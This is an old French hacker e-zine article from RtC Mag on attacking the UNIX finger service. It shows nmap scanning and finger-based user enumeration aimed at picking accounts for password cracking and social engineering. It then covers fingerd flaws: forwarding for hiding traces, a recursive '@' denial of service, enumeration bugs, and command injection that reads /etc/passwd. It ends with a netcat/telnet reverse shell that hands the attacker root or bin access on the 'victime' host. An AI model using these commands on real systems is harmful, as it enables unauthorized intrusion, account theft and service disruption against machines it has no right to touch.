@@ -1,0 +1,263 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  Hacking Finger in the nose  ]
+---------[ in RtC mag 4 ]
+----[  by SLy <sly-rtc@fr.st>  ]
+
+
+-------[  01) RAPPEL
+
+a) Description
+ 
+    L'outil UNIX finger est probablement une des astuces les plus anciennes en matiere de recensement d'utilisateur. D'ailleurs de nombreux scripts d'attaques s'en servent car de nombreux 
+administrateurs systèmes sympa laisse tourner fingerd sur des ordi mal configurés.
+Donc le service 'finger' donne des informations utiles , puisqu'il permet d'obtenir des noms d'utilisateurs,(qqq fois avec leur mail ou leur numéro de téléphone et des infos complémentaire), de déterminer si une machine est en train d'etre utilisée, etc...
+en vu de cracker les pass ou de faire du SE.
+
+b) Savoir si finger est exécuter sur la victime
+
+Tout d'abord il faut savoir que le service finger s'exécute sur le port 79. Donc on peut savoir si une machine exécute finger :
+
+$nmap -v -sS ip_victime
+
+Starting nmap V. 2.52 by fyodor@insecure.org ( www.insecure.org/nmap/ )
+Host victime (ip_victime) appears to be up ... good.
+Initiating SYN half-open stealth scan against localhost (ip_victime)
+Adding TCP port 515 (state open).
+Adding TCP port 79 (state open).
+The SYN scan took 3 seconds to scan 1034 ports.
+Interesting ports on localhost (ip_victime):
+(The 1032 ports scanned but not shown below are in state: closed)
+Port       State       Service
+79/tcp     open        finger         <<< Hoho         
+515/tcp    open        printer                 
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 3 seconds
+Si nfinger désactivée
+
+
+De toute facon si la victime n'exécute pas le service finger vous trouverez :
+$ finger @victime
+[victime]
+finger: connect: Connexion refusée
+
+ou
+
+$ finger @ip_victime
+[ip_victime]
+finger: connect: Connexion refusée
+
+
+c) Comment ça marche ?
+
+$ finger @victime
+[victime]
+Login     Name      Tty  Idle  Login Time   Office     Office Phone 
+root      root       *1    38  Jun 20 13:12 
+root      root      *p0        Jun 20 13:50 
+root      root      *p1        Jun 20 13:37 
+root      root      *p2     1  Jun 20 13:38
+
+   Donc la on voit qu'il y a 4 "root".
+Ca veut pas dire qu'il y a 4 root connecté à la machine?
+Non, on regarde Tty on voit 
+- *1 : il y a un gars qui est root en ce moment sur la machine.
+- *p0, *p1, *p2 : il a lancé 3 terminal (on voit en fait les noms des terminals)
+ De plus on peut voir depuis combien de temps ils sont là (login time) et le idle time.
+Y a un qui est la depuis le 20 juin à 13:12 mais bon ceci est relatif à l'heure de la machine :
+on peut utiliser le port DayTime (port 13 en tcp/udp) s'il est ouvert, ...
+
+Le plus facile est si le port DayTime est ouvert en tcp :
+$telnet victime daytime
+Trying ip_victime...
+Connected to victime.
+Escape character is '^]'.
+Thu Apr 26 11:22:49 2001
+
+Reste plus qu'a comparez les deux dates.
+(remarque : ces deux trucs n'ont pas été fait à la même date)
+
+En remote, quand je tape "user@host" ca correspond a l'option -l par défaut.
+En remote, quand je tape "@host" ca correspond a l'option -s par défaut.
+
+$ finger -l @victime
+[victime]
+Login: root                             Name: root
+Directory: /root                        Shell: /bin/bash
+On since Tue Jun 20 13:12 (CEST) on tty1    43 minutes 49 seconds idle
+     (messages off)
+On since Tue Jun 20 13:50 (CEST) on ttyp0 (messages off)
+On since Tue Jun 20 13:37 (CEST) on ttyp1   6 minutes 15 seconds idle
+     (messages off)
+On since Tue Jun 20 13:38 (CEST) on ttyp2   7 minutes 7 seconds idle
+     (messages off)
+No mail.
+No Plan.               
+
+On voit donc les même informations qu'avant (quand l'option était -s) plus d'autres (qui peuvent être utile pour connaître sa victime (:
+- 43 minutes 49 seconds idle pour tty1 : il utilise une interface graphique.
+- depuis combien de temps les ttyp* n'ont pas été touché (par exemple depuis  6 minutes 15 seconds pour le tty3)
+(Remarque : y a pas de temps pour tty0 car c'est une xterm où la victime tape ses commandes ,...) 
+- Son nom, où il commence et où est son bash
+- un mail (c pas souvent qu'on en voit)
+- (messages off) : ceci apparait si on n'a pas le droit d'écriture sur le périphérique.
+- des autres choses dans plan du genre :
+Plan :                        << qui correspond au fichier .plan
+John Smith
+Telnet password is my birthday  << plus qu'a essayer
+
+d) Dans "finger root@victime", je peux remplacer root par un autre utilisateur pour avoir des info sur lui.
+
+$ finger essai@victime
+[victime]
+finger: essai: no such user.                                 
+
+Ah ouais, c'est vrai l'utilisateur essai n'existe pas sur la machine victime.
+
+Je remplace donc "essai" par bin et j'obtiens ça :
+
+$ finger bin@victime
+[victime]
+Login: bin                              Name: bin
+Directory: /bin                         Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+Maintenant j'essais avec "cool" :
+
+$ finger cool@victime
+[victime]
+Login: cool                             Name: master
+Directory: /                            Shell: /bin/bash
+Last login Sun Jun 18 14:41 (CEST) on ttyp1 from localhost
+No mail.
+No Plan.            
+
+J'en déduis donc qu'il y a bien un utilisateur cool sur la machine d'en face. Je peux donc essayé de cracker la pass puisque que j'ai un login .
+
+On peut quand il s'est connecté. En faisant ceci régulièrement vous pouvez savoir quels sont les jours et les heures à laquelle le user se connecte.
+
+
+
+-------[  02) FAILLE
+
+Bien sûr que finger a des failles qui marche en général que sur des versions anciennes:
+
+- finger redirection (Niveau de risque pour victime : Faible) + DoS
+- Cfinger search.**@host (Niveau de risque pour victime : Faible/Moyen)
+- finger dot at host (Niveau de risque pour victime : Moyen)
+- finger zero at host (Niveau de risque pour victime : Moyen)
+- in.fingerd |commandes@host bug (Niveau de risque pour victime : Elevé :)
+
+
+
+    a) Redirection de finger grâce à fingerd : 
+
+Système cible potentiel : Solaris 2.5.1/2.6 , SunOS 4.1.4, IRIX 5.3 
+
+   Quelques daemons de finger permettent de faire suivre la requête finger à d'autres sites éloignés. C'est à dire que les utilisateurs peuvent faire des requêtes du type :
+
+$finger username@hostA@hostB
+
+   La requête finger passera par hostB pour aller vers hostA. Cela sert à couvrir nos traces parce qu'HostA verra qu'il a recu une requête finger venant d'HostB au 
+lieu du service original. 
+
+   Cette technique peut être utilisé pour passer au-travers d'un firewall s'ils ne sont pas correctement configurés. Cela peut arriver par finger user@host@firewall.
+
+   Aussi si le daemon finger d'un site vous permet de faire ceci, il y a ptit DoS à faire (d'ailleurs très simple à comprendre):
+
+$finger @host@host@host@host@host@host[...]@host@host@host
+ou 
+$finger username@@@@@@@@@@@@@@@@@[...]@@@@hostA 
+
+   Le @ répétées avec finger peut conduire le daemon finger à se répéter récursivement sur la même machine (hostA) jusqu'à ce que la machine plante ou ralentit à des vitesses inutilisables.
+
+   Si cette technique ne marche pas vous devriez voir apparaître :
+fingerd: forwarding not allowed
+
+
+
+    b) Cfinger search.*@host :
+
+Système cible potentiel : les systèmes qui ont cfinger 1.2.2 ou 1.3.2 
+
+Il y a un bug dans le daemon cfinger qui permet à n'importe qui d'obtenir 
+la liste des utilisateurs du système en faisant la commande :
+- Si ils ont cfinger 1.2.2, il faut taper :
+$finger search.*@victime
+
+- Si ils ont cfinger 1.3.2, il faut taper :
+$finger search.**@victime
+
+   Cette information a beaucoup d'interêt, parcequ'avec elle, on a la liste des utilisateurs, et on n'a plus qu'à cracker un des mots de passe par force brute en utilisant un autre service (telnet, ftp...)
+
+
+    c) finger dot at host :
+
+   Il y a un bug dans le service finger qui lui fait afficher la liste des comptes qui n'ont jamais été utilisés, quand quelqu'un fait la requète :
+ 
+$finger .@victime
+  
+   Cette liste va permettre de deviner le type de système d'exploitation de la victime. Il va aussi dire quels comptes n'ont jamais été utilisés, ce qui nous fera souvent nous concentrer sur ceux-ci.
+
+
+    d) finger zero at host :
+
+   Il y a un bug dans le service finger qui lui fait afficher la liste des comptes qui n'ont jamais été utilisés, quand quelqu'un fait la requête :
+ 
+$finger 0@victime
+
+Ca sert donc à la même chose qu'avant
+ 
+    e)Exécuter des commandes avec finger
+
+   Certain daemon finger permettront à un utilisateur éloigné d'éxecuter des commandes, souvent avec l'uid root ou bin. Le daemon finger permet à n'importe qui d'executer des commandes en tant que root, en faisant des requêtes telles que :
+
+$finger |commandes_à_executer@cible
+
+   Y a plusieurs façon pour voir si ça marche :
+1) essayer
+2) Taper finger /W@host et
+si vous recevez un truc comme ça le système peut être vulnérable :
+Login name: /W                          In real life: ???
+
+Donc pour voir l'uid de in.fingerd qui est exécuté sur la machine d'en face, essayer : 
+
+        finger "|/bin/id@host"
+
+et espérer qu'il y a ça qui apparraissent
+
+        uid=0(root) gid=0(root)
+ou
+        uid=2(bin) gid=2(bin) groups=2(bin),3(sys),5(mail)
+
+
+
+   Grâce à cette technique vous pouvez faire comme commandes "|/bin/cat /etc/passwd\n" si vous n'avez pas d'idée. Mais le fin du fin c'est d'utiliser le telnet inversé (voir article de Paranoid) car vous aurez un shell avec l'uid root ou bin !!!!
+
+Pour le faire vous pouvez soit lire l'article de Paramoid, soit exécuter ca sur votre machine.
+- Sur votre 1ere xterm :
+$nc -l -vv -p 80
+listenig on [any] 80 ...
+
+- Sur votre 2eme xterm
+$nc -l -vv -p 21
+listenig on [any] 21 ...
+
+- Sur une 3eme xterm, on utilise l'exploit sur finger :
+$finger "|/bin/telnet your_ip_address 80| /bin/sh |/bin/telnet your_ip_address 21@victime"
+
+Qu'est-ce que ça fait
+
+- /bin/telnet your_ip_address 80 :
+ Ca connecte la victime à ton pc sur le port 80 qui est écouté avec netcat. C'est la fenêtre où tu tapperas tes commandes que tu veux exécuter.
+
+- | /bin/sh  :
+On pipe la sortie de la fenêtre telnet sur le shell.
+
+- |/bin/telnet your_ip_address 21 :
+On renvoie le résultat du shell sur un nouveau écran telnet qui est connecté à notre port 21.
+
+
+-------[  EOF
